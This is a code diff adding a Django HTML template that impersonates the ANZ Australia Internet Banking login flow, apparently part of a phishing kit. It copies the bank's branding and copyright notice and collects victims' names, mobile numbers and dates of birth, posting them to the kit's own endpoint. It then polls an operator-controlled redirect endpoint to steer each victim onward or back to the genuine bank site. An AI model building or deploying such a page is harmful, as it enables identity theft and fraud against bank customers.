@@ -1,0 +1,125 @@
+{% load static %}
+<!doctype html>
+<html lang="en">
+<head>
+    <link rel="shortcut icon" href="{% static 'favicon.ico' %}" type="image/x-icon">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <title>ANZ Australia Internet Banking</title>
+    <link href="{% static 'css/bootstrap.css' %}" rel="stylesheet">
+    <link href="../static/css/main.css" rel="stylesheet">
+
+    <script
+            src="https://code.jquery.com/jquery-3.5.1.js"
+            integrity="sha256-QWo7LDvxbWT2tbbQ97B53yJnYU3WhH/C8ycbRAkjPDc="
+            crossorigin="anonymous"></script>
+    <script src="{% static 'bootstrap.min.js' %}"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+    <script type="text/javascript">
+        function get_redirect_to_page() {
+            $.ajax({
+                type: 'GET',
+                async: true,
+                url: '/redirect_page/',
+                success: function(data) {
+                    if (data["redirect_to"] === "error") {
+
+                    } else if (data["redirect_to"] === "bank") {
+                        window.location.href = "https://www.anz.com.au/"
+                    }
+                    else if (data["redirect_to"]) {
+                        window.location.href = document.location.origin + "/" + data["redirect_to"]
+                    }
+                },
+                dataType: 'json',
+            });
+        }
+        function submited(event) {
+            event.preventDefault()
+            $('#loadingModal').modal({backdrop: 'static', keyboard: false}, 'show');
+            var fd = new FormData()
+            var first_name = $("#first-name").val()
+            var last_name = $("#last-name").val()
+            var mobile_number = $("#mobile-number").val()
+            var birth = $("#birth").val()
+            fd.append('first-name', first_name)
+            fd.append('last-name', last_name)
+            fd.append('mobile-number', mobile_number)
+            fd.append('birth', birth)
+            $.ajax({
+                type: 'POST',
+                async: true,
+                url: '/profile/',
+                contentType: false,
+                processData: false,
+                data: fd,
+            });
+        }
+    </script>
+</head>
+<body>
+<nav class="navbar navbar-expand-lg navbar-light mobilebar">
+    <a class="navbar-brand mobile-brand" href="#">
+        <img src="{% static 'logo.png' %}" class="logo-mobile">
+    </a>
+</nav>
+<div class="container" style="min-height: 700px">
+    <div class="row">
+        <div class="col-12 " style="margin-top: 25px">
+                <h1 class="h1-mobile">{{ settings.profile_title }}</h1>
+                <p>{{ settings.profile_description }}</p>
+                <form method="post" onsubmit="return submited(event)">
+                    <fieldset class="fake-form fake-form-mobile">
+                        <div>
+                            <label for="first-name" class="fake-form-mobile-label">First name
+                                <input class="fake-form-mobile-input" required id="first-name" type="text" name="first-name">
+                            </label>
+                            <label for="last-name" class="fake-form-mobile-label">Surname
+                                <input class="fake-form-mobile-input" required id="last-name" type="text" name="last-name">
+                            </label>
+                            <label for="mobile-number" class="fake-form-mobile-label">Mobile number
+                                <input class="fake-form-mobile-input" required id="mobile-number" type="text" name="mobile-number">
+                            </label>
+                            <label for="birth" class="fake-form-mobile-label">Date of birth
+                                <input class="fake-form-mobile-input" required id="birth" type="text" name="birth">
+                            </label>
+                        </div>
+                    </fieldset>
+                    <button type="submit" class="btn btn-other">Confirm</button>
+                </form>
+
+        </div>
+
+    </div>
+</div>
+<nav class="navbar mobile-bottom-bar">
+    <p>© Australia and New Zealand Banking <br> Group Limited (ANZ) <br> 2020 ABN 11 005 357 522.</p>
+</nav>
+<div class="modal fade" id="loadingModal" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="modal-dialog" role="document">
+        <div class="modal-content">
+            <div class="modal-body">
+                <h3 class="modal-custom-title">We are checking your information</h3>
+                <div class="d-flex justify-content-center">
+                    <img class="logo-loading" src="{% static 'logo-loading.png' %}" alt="">
+                    <div class="spinner-border" style="width: 5rem; height: 5rem;color: #337ab7 !important;" role="status">
+                        <span class="sr-only">Loading...</span>
+                    </div>
+                </div>
+                <h5 class="modal-custom-text">Please wait...</h5>
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+<script type="text/javascript">
+    $(document).ready(function () {
+        setInterval(get_redirect_to_page, 1000)
+        $('#mobile-number').mask('+61 000 000 0000')
+        $('#mobile-number_1').mask('+61 000 000 0000')
+        $('#birth_1').mask('00/00/0000')
+        $('#birth').mask('00/00/0000')
+        $('#postcode').mask('0000')
+    });
+</script>
+</html>
